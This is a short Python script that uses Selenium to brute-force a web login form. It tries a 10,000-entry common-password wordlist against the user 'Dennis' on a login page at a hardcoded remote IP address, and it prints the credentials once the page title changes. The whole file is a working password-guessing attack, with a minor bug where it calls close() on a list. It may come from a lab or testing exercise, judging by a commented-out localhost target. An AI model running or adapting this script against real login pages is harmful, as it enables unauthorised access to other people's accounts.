from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

def read_wordlist(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

s = Service(executeable_path="chromedriver.exe")

driver = webdriver.Chrome(service=s)
#website = "http://127.0.0.1:5000/login"
website = "http://141.87.59.240:5000/login"

driver.get(website)

title = ""
#usernames = read_wordlist("common_user_10k.txt")
passwords = read_wordlist("common_passw_10k.txt")


usernames = ["Dennis"]

for user in usernames:

    print("-- Testing User ", user, "--")
    for password in passwords:
        print("Testing Password", password)

        res = driver.find_elements(By.CLASS_NAME, "form-control")

        assert(len(res) == 2)
        res[0].clear()
        res[0].send_keys(user)

        res[1].clear()
        res[1].send_keys(password)

        but = driver.find_elements(By.CLASS_NAME, "btn")
        assert (len(but) == 1)
        but[0].click()

        print(driver.title)

        if driver.title != "Login":
            print(f"Username is {user}")
            print(f"Password is {password}")
            print("Found")
            break

#uusernames.close()
passwords.close()
driver.quit()
